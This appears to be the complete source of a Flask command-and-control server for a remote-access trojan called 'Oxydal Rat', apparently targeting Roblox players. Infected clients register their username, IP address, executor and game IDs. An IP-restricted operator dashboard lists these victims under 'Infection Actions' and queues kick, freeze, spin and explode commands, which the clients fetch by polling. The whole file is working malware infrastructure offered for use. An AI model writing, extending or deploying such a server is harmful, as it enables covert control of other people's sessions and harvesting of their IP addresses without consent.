from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO
import time
import eventlet

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "oxydal_emerald_key_2024"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}

connected_players = {}
pending_kicks = {}
pending_commands = {}

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS:
        abort(403)

@app.before_request
def protect_routes():
    if request.path in ["/", "/kick", "/troll"]:
        check_ip()

# --- DESIGN EMERALD AVEC OPTION DE SUPPRESSION LOCALE ---

HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Oxydal Rat | Emerald Command</title>
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #00ffcc;
            --primary-glow: rgba(0, 255, 204, 0.4);
            --bg: #030a0e;
            --card-bg: rgba(6, 18, 24, 0.85);
            --border: rgba(0, 255, 204, 0.15);
            --danger: #ff3366;
            --warning: #ffcc00;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body {
            font-family: 'Inter', sans-serif;
            background: radial-gradient(circle at top right, #0a1f26 0%, #030a0e 100%);
            color: #fff;
            min-height: 100vh;
            padding: 20px;
        }

        header { text-align: center; margin-bottom: 40px; }
        h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 3rem;
            color: var(--primary);
            text-shadow: 0 0 15px var(--primary-glow);
            letter-spacing: 5px;
        }

        .stats-bar {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 50px;
            padding: 8px 25px;
            display: inline-flex;
            align-items: center; gap: 15px;
            margin-top: 15px;
            font-family: 'Orbitron'; font-size: 0.9rem;
        }

        .grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fill, minmax(360px, 1fr)); 
            gap: 25px; 
            max-width: 1400px; margin: auto;
        }

        /* Card Styling */
        .card {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 20px;
            position: relative;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            animation: cardIn 0.5s ease-out;
        }

        @keyframes cardIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
        
        /* Bouton Fermer (Croix) */
        .close-btn {
            position: absolute;
            top: 12px; right: 12px;
            width: 24px; height: 24px;
            background: rgba(255,255,255,0.05);
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            cursor: pointer; color: #666; font-weight: bold;
            transition: all 0.2s; border: 1px solid transparent;
        }
        .close-btn:hover {
            background: var(--danger);
            color: #fff; transform: rotate(90deg);
        }

        .card-header { margin-bottom: 15px; padding-right: 30px; }
        .player-name { font-family: 'Orbitron'; font-size: 1.2rem; color: var(--primary); display: block; }
        
        .status-tag {
            font-size: 0.7rem; font-weight: bold; display: flex; align-items: center; gap: 5px; margin-top: 5px;
        }
        .dot { width: 8px; height: 8px; border-radius: 50%; background: #444; }
        .dot.online { background: var(--primary); box-shadow: 0 0 8px var(--primary); }

        .player-info { font-size: 0.8rem; color: #888; margin-bottom: 15px; line-height: 1.4; }
        .player-info b { color: #ccc; }

        .cat-title { font-size: 0.7rem; color: #555; text-transform: uppercase; margin: 15px 0 8px; letter-spacing: 1px; }

        /* Buttons */
        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
        button {
            padding: 8px; border-radius: 4px; border: 1px solid var(--border);
            background: rgba(255,255,255,0.02); color: #bbb;
            font-family: 'Orbitron'; font-size: 0.65rem; cursor: pointer; transition: 0.2s;
        }
        button:hover { background: var(--primary); color: #000; border-color: var(--primary); }
        button.kick { border-color: var(--danger); color: var(--danger); }
        button.kick:hover { background: var(--danger); color: #fff; }

        /* Animation suppression */
        .hidden-card { opacity: 0; transform: scale(0.5) translateY(-50px); pointer-events: none; }

        /* Modals & Toasts simplifiés */
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); align-items: center; justify-content: center; z-index: 100; }
        .modal.active { display: flex; }
        .modal-content { background: #050f14; border: 1px solid var(--primary); padding: 25px; border-radius: 10px; width: 300px; text-align: center; }
        input { width: 100%; padding: 10px; margin: 15px 0; background: #000; border: 1px solid var(--border); color: #fff; outline: none; }
    </style>
</head>
<body>

<header>
    <h1>OXYDAL <span style="font-weight:300">RAT</span></h1>
    <div class="stats-bar">
        <span>ONLINE: <span id="online-count" style="color:var(--primary)">0</span></span>
        <span style="opacity:0.3">|</span>
        <span id="total-count">TOTAL: 0</span>
    </div>
</header>

<div class="grid" id="players"></div>

<div class="modal" id="kickModal">
    <div class="modal-content">
        <h2 style="font-family:Orbitron; font-size:1rem;">TERMINATE USER</h2>
        <input type="text" id="kickReason" placeholder="Reason...">
        <div class="btn-grid">
            <button onclick="closeModal()">CANCEL</button>
            <button onclick="performKick()" class="kick">EXECUTE</button>
        </div>
    </div>
</div>

<script>
    const socket = io();
    let selectedId = null;
    let localHiddenPlayers = new Set(); // Pour stocker les joueurs masqués manuellement

    function hidePlayer(id) {
        const card = document.getElementById(`card_${id}`);
        if(card) {
            card.classList.add("hidden-card");
            localHiddenPlayers.add(id);
            setTimeout(() => card.remove(), 400);
        }
    }

    function openKick(id) { selectedId = id; document.getElementById("kickModal").classList.add("active"); }
    function closeModal() { document.getElementById("kickModal").classList.remove("active"); }

    function performKick() {
        const r = document.getElementById("kickReason").value || "Admin Kick";
        fetch("/kick", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: selectedId, reason: r})});
        closeModal();
    }

    function sendTroll(id, cmd) {
        fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: id, cmd: cmd})});
    }

    socket.on("update", (data) => {
        document.getElementById("online-count").textContent = data.online;
        document.getElementById("total-count").textContent = `TOTAL: ${data.total}`;
        const grid = document.getElementById("players");

        Object.entries(data.players).forEach(([id, p]) => {
            // Si le joueur est dans notre liste "masquée", on ne l'affiche pas
            if(localHiddenPlayers.has(id)) return;

            let card = document.getElementById(`card_${id}`);
            if(!card) {
                card = document.createElement("div");
                card.className = "card";
                card.id = `card_${id}`;
                grid.appendChild(card);
            }

            card.innerHTML = `
                <div class="close-btn" onclick="hidePlayer('${id}')">×</div>
                <div class="card-header">
                    <span class="player-name">${p.username}</span>
                    <div class="status-tag">
                        <div class="dot ${p.online ? "online" : ""}"></div>
                        <span style="opacity:0.6">${p.online ? "STABLE" : "LOST"}</span>
                    </div>
                </div>
                <div class="player-info">
                    IP: <b>${p.ip}</b><br>
                    EXE: <b>${p.executor}</b><br>
                    GAME ID: <b>${p.gameId}</b>
                </div>
                
                <div class="cat-title">Infection Actions</div>
                <div class="btn-grid">
                    <button class="kick" onclick="openKick('${id}')">KICK</button>
                    <button onclick="sendTroll('${id}','freeze')">FREEZE</button>
                    <button onclick="sendTroll('${id}','spin')">SPIN</button>
                    <button onclick="sendTroll('${id}','explode')">EXPLODE</button>
                </div>
                <div class="cat-title">Maintenance</div>
                <div class="btn-grid">
                    <button onclick="sendTroll('${id}','unfreeze')" style="font-size:0.5rem">UNFREEZE</button>
                    <button onclick="sendTroll('${id}','unspin')" style="font-size:0.5rem">UNSPIN</button>
                </div>
            `;
        });

        // Supprimer les cartes des joueurs qui ne sont plus dans la liste serveur
        const serverIds = new Set(Object.keys(data.players));
        document.querySelectorAll('.card').forEach(c => {
            const cid = c.id.replace('card_', '');
            if(!serverIds.has(cid)) c.remove();
        });
    });
</script>
</body>
</html>"""

# --- LE RESTE DU CODE PYTHON RESTE IDENTIQUE ---

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        try:
            d = request.get_json(silent=True) or {}
            uid = str(d["userid"])
            if d.get("action") == "register":
                connected_players[uid] = {
                    "username": d.get("username", "Unknown"),
                    "executor": d.get("executor", "Unknown"),
                    "ip": d.get("ip", "Unknown"),
                    "last": now,
                    "online": True,
                    "game": d.get("game", "Unknown"),
                    "gameId": d.get("gameId", 0),
                    "jobId": d.get("jobId", "Unknown")
                }
            elif d.get("action") == "heartbeat" and uid in connected_players:
                connected_players[uid]["last"] = now
        except: pass
        return jsonify({"ok": True})

    if request.method == "GET":
        uid = str(request.args.get("userid", ""))
        if not uid: return jsonify({})
        if uid in pending_kicks:
            reason = pending_kicks.pop(uid, "Kicked")
            return jsonify({"command": "kick", "reason": reason})
        if uid in pending_commands:
            cmd = pending_commands.pop(uid)
            return jsonify({"command": cmd.get("cmd") if isinstance(cmd, dict) else cmd, "assetId": cmd.get("assetId") if isinstance(cmd, dict) else None})
        return jsonify({})

@app.route("/kick", methods=["POST"])
def kick():
    check_ip()
    data = request.get_json() or {}
    uid, reason = str(data.get("userid", "")), data.get("reason", "No reason")
    pending_kicks[uid] = reason
    socketio.emit("kick_notice", {"username": "User", "reason": reason})
    return jsonify({"sent": True})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    data = request.get_json() or {}
    uid, cmd = str(data.get("userid", "")), data.get("cmd", "")
    if uid and cmd:
        pending_commands[uid] = cmd
    return jsonify({"sent": True})

def broadcast_loop():
    while True:
        now = time.time()
        online = 0
        to_remove = []
        for uid, p in connected_players.items():
            if now - p["last"] > 30: to_remove.append(uid)
            else:
                p["online"] = now - p["last"] < 15
                if p["online"]: online += 1
        for uid in to_remove: connected_players.pop(uid, None)
        socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
